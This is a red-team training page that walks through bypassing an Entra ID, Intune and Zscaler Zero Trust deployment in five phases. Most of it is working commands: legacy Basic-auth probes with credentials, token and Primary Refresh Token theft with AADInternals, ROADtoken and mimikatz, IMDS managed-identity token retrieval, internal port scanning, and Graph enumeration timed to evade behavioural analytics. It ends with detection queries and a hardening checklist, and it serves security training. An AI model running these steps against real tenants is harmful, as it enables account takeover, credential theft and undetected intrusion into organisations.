---
layout: training-page
title: "Zero Trust Architecture Bypass — Full Attack Scenario"
module: "Scenarios"
tags:
  - zero-trust
  - scenario
  - conditional-access
  - device-compliance
  - lateral-movement
  - microsegmentation
  - identity
  - entra-id
page_key: "scenarios-zero-trust-bypass"
render_with_liquid: false
---

# Zero Trust Architecture Bypass — Full Attack Scenario

Zero Trust is not zero attack surface. It shifts controls to identity, device health, and continuous verification — which means the attack surface shifts there too. This scenario walks through bypassing a mature ZTA implementation across five control layers: identity verification, device compliance, network microsegmentation, application-layer authorization, and behavioral analytics.

**Scenario premise:** Target has fully deployed ZTA — Entra ID Conditional Access, Microsoft Intune device compliance, Zscaler Private Access for network segmentation, and Defender XDR for behavioral monitoring. No VPN. No perimeter firewall. "Trust nothing, verify everything."

---

## Understanding the ZTA Control Stack

```
ZTA Control Layer      Control Mechanism         Bypass Surface
─────────────────────────────────────────────────────────────────
Identity Verification  MFA (Entra ID CA)          Device code phishing,
                                                   token theft, legacy auth
Device Compliance      Intune enrollment,          Token on unmanaged device,
                       health attestation          compliance bypass
Network Segmentation   Zscaler ZPA / ZTNA          App connector compromise,
                       microsegmentation           split tunnel abuse
App Authorization      OAuth scopes, RBAC          Scope escalation,
                       Conditional Access          policy gaps
Behavioral Analytics   UEBA, Sentinel anomaly      Slow & low, living off
                       detection                   the land
```

---

## Phase 1: Identity Control Bypass — Token Theft Without MFA

Even in Zero Trust, tokens are issued *after* authentication. Stealing a post-MFA token is valid until revocation.

```
# Method 1: Device code phishing (MFA bypassed by design)
# Victim authenticates including MFA — attacker receives token
# Full details: see OAuth Device Code Phishing page

# Method 2: Primary Refresh Token (PRT) theft from managed device
# PRTs are cached in LSASS on Windows — supersede individual access tokens
# PRT is proof of "compliant device + valid user" combined

# Steal PRT from session using custom tool (requires SYSTEM on joined device):
# ROADtoken (dumps PRT from Windows SSO state):
# github.com/dirkjanm/ROADtoken

# Method 3: Conditional Access policy gaps — legacy authentication protocols
# Even "MFA required" CA policies often exclude legacy auth to avoid breakage
# Test if Exchange ActiveSync or Basic Auth to legacy endpoints still works:
curl -s "https://outlook.office365.com/EWS/Exchange.asmx" \
  -H "Authorization: Basic $(echo -n 'user@domain.com:Password1!' | base64)" \
  -d '<soap:Envelope>...' | grep -i "ResponseClass"
# If 200 OK → legacy auth not blocked → no MFA

# Method 4: Named Locations bypass
# CA policies often exclude corp IP ranges or "trusted" named locations
# From an already-compromised internal system, tokens issued with no MFA challenge
```

---

## Phase 2: Device Compliance Bypass

ZTA requires enrolled, compliant devices for resource access. A token from a non-compliant device gets blocked at the resource. The bypass: use tokens from a compliant device.

```
# Check if token is from a compliant device:
# Decode the JWT access token:
echo "$ACCESS_TOKEN" | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
parts = token.split('.')
padded = parts[1] + '=' * (-len(parts[1]) % 4)
print(json.dumps(json.loads(base64.b64decode(padded)), indent=2))
" | grep -E '"deviceid"|"compliant"|"iss"|"amr"'
# Look for: "deviceid" claim, "amr" including "ngcmfa" (Windows Hello)

# Compliance bypass method 1: Steal token FROM a compliant managed device
# Once on a managed endpoint (e.g., via spear phish on corporate laptop),
# token in browser/MSAL cache is already device-compliant:

# Dump MSAL token cache (Edge/Chrome signed-in profile):
python3 -c "
import json, os, glob
# Edge MSAL cache location:
path = os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb')
# This requires dedicated tooling — use AADInternals Get-AADIntAccessToken
"

# AADInternals — extract tokens from managed device:
Import-Module AADInternals
# Run on compromised managed Windows endpoint:
$token = Get-AADIntAccessTokenFromCache -Resource "https://graph.microsoft.com"

# Compliance bypass method 2: PRT-based token replay
# PRT-based tokens carry device compliance claims automatically
# ROADtoken example usage (run on domain-joined device):
.\ROADtoken.exe
# Outputs access token carrying DeviceId + compliant claims
# Use this token from any system — compliance claim travels with token
```

---

## Phase 3: ZTNA / Microsegmentation Bypass

Zscaler Private Access (ZPA) or similar ZTNA replaces VPN. Applications are only accessible through app connectors. Bypass: compromise an app connector or an already-connected endpoint.

```
# Enumerate ZPA-connected applications from a compromised managed endpoint:
# ZPA agent is installed on managed devices — already connected to app connector
# From compromised endpoint, target apps are directly reachable on internal network segment

# Identify internal apps via DNS (ZPA creates private DNS zones):
cat C:\Windows\System32\drivers\etc\hosts 2>/dev/null
ipconfig /all | findstr "DNS Suffix"
# Internal hostnames resolved by ZPA: app1.company.internal, db01.corp.local

# Port scan reachable segments (ZPA defines micro-segments, not full network):
python3 -c "
import socket
targets = ['app1.company.internal', 'hr-portal.corp.local', 'db01.internal']
ports = [80, 443, 3306, 1433, 5432, 22, 3389]
for host in targets:
    for port in ports:
        try:
            s = socket.create_connection((host, port), timeout=1)
            print(f'{host}:{port} OPEN')
            s.close()
        except: pass
"

# App connector compromise — if connector host is accessible:
# ZPA App Connector runs as a privileged service with outbound-only connectivity
# Compromise the connector host → can reach ALL apps the connector serves
# Find connector: look for hosts running 'connector' service or 'zpa-connector' process

# Split tunnel abuse:
# ZPA/ZTNA often only tunnels specific DNS suffixes
# Traffic to unprotected destinations goes direct
# From managed device: reach unprotected internal RFC1918 via direct route
route print | findstr "10\.\|192\.168\."
```

---

## Phase 4: Lateral Movement Under ZTA

Without traditional lateral movement (no SMB everywhere, no RDP by default), ZTA environments push attackers to identity-based pivoting.

```
# Token-based lateral movement:
# Steal tokens from each new compromised host's browser/app cache
# Each token may have different scope/access based on user's role

# Service principal impersonation:
# Managed identities on Azure VMs — no credential, token from IMDS:
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com"

# If managed identity has Graph or Azure RBAC permissions → pivot via API
# Check what the managed identity can access:
az role assignment list --assignee <managed-identity-object-id>

# Pass-the-PRT (Windows Hello for Business abuse):
# On Windows 11 managed device, PRT is protected by TPM — normally not extractable
# BUT: if device uses software-based credential (no TPM), PRT may be in LSASS
mimikatz # lsadump::cloudap
# Extract NGC key and PRT → forge tokens with device compliance claims

# Service account token theft:
# ZTA doesn't protect service accounts well — they often use legacy auth or
# bypass CA policies due to "service account exclusion" common misconfiguration
# Find service account exclusions in CA policy audit logs:
Get-MgIdentityConditionalAccessPolicy | ConvertTo-Json -Depth 10 | \
  Select-String -Pattern "excludeUsers\|excludeGroups" -Context 2
```

---

## Phase 5: Behavioral Analytics Evasion

ZTA implementations often layer UEBA and anomaly detection. Techniques to reduce anomaly signals:

```
# Living off the land — use native M365 and Azure tooling, not custom payloads:
# Microsoft Graph API: appears as normal app access
# Azure CLI / az commands: appear as legitimate management
# PowerShell via Runbooks: runs in Azure, not on monitored endpoint

# Slow enumeration — spread API calls over time:
python3 << 'EOF'
import requests, time, random

headers = {"Authorization": f"Bearer {ACCESS_TOKEN}"}
# Instead of bulk dump, enumerate one user every 30-90 seconds:
users = ["user1@contoso.com", "user2@contoso.com"]
for user in users:
    r = requests.get(f"https://graph.microsoft.com/v1.0/users/{user}", headers=headers)
    print(r.json().get('displayName'))
    time.sleep(random.uniform(30, 90))  # randomized delay
EOF

# Avoid high-signal operations:
# DO NOT: Download all files (triggers DLP)
# DO NOT: Enumerate all users at once (triggers Identity Protection)
# DO NOT: Access resources outside normal business hours (triggers Location/Time anomaly)
# DO: Blend into normal user behavior patterns

# Conditional Access evaluation log — understand what's being checked:
# Azure portal → Entra ID → Sign-in logs → CA: Success entries
# Tells you exactly which policies evaluated your token
```

---

## Common ZTA Misconfigurations

```
# 1. Service account CA exclusions (bypass MFA for "compatibility"):
#    Find accounts excluded from MFA policy → password spray these accounts

# 2. Legacy authentication not fully blocked:
#    Test SMTP AUTH, EAS, IMAP with Basic Auth:
curl -s --ntlm -u "user@domain.com:Password1!" \
  "https://outlook.office365.com/autodiscover/autodiscover.xml"

# 3. Named Location trust too broad:
#    If corp IP range is trusted with no MFA, compromise any device on that range
#    Then tokens are issued without MFA challenge

# 4. App-level bypass: apps registered before ZTA rollout may have legacy policies
#    Enumerate registered apps with relaxed policies:
curl -s "https://graph.microsoft.com/v1.0/applications" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | \
  jq '.value[] | select(.createdDateTime < "2023-01-01") | .displayName,.id'

# 5. Managed identity over-permission:
#    VMs with Contributor RBAC at subscription level → full Azure control
az vm list --query "[?identity.type=='SystemAssigned'].{name:name,rg:resourceGroup}" -o table
```

---

## Detection & Defense Recommendations

```
# Detection gaps this scenario exploits:
# 1. Device code flow sign-ins — alert on AuthenticationProtocol == deviceCode
# 2. PRT theft — look for Entra ID token anomalies (new device, new location with valid PRT)
# 3. Bulk Graph API calls — alert on >50 user reads in 5-minute window
# 4. Service account usage from unexpected IPs
# 5. Managed identity accessing resources outside expected scope

# KQL — Entra ID sign-in anomalies:
# SigninLogs
# | where AuthenticationProtocol == "deviceCode" or LegacyTlsDialogResult has "success"
# | where ConditionalAccessStatus == "success"
# | project UserPrincipalName, IPAddress, AppDisplayName, AuthenticationProtocol
# | summarize count() by UserPrincipalName, AuthenticationProtocol

# ZTA hardening checklist:
# - Block all legacy authentication (no EAS/SMTP/IMAP Basic Auth exceptions)
# - Require phishing-resistant MFA (FIDO2/WHfB) for all privileged roles
# - Named locations: restrict to /32 or known egress ranges only
# - CA policy: "Require compliant device" on all cloud apps, no service account exclusions
# - Privileged Identity Management: require JIT activation for admin roles
# - Token revocation on risky sign-in: configure Token Protection (preview)
```

---

## Resources

- Microsoft ZTA deployment guide — `learn.microsoft.com/en-us/security/zero-trust/`
- AADInternals ZTA attacks — `aadinternals.com`
- Entra ID Conditional Access documentation — `learn.microsoft.com/en-us/entra/identity/conditional-access/`
- ROADtools for Entra ID enumeration — `github.com/dirkjanm/ROADtools`
- Zscaler ZPA architecture — `help.zscaler.com/zpa`
- CISA Zero Trust Maturity Model — `cisa.gov/zero-trust-maturity-model`
- Pass-the-PRT technique — `dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/`
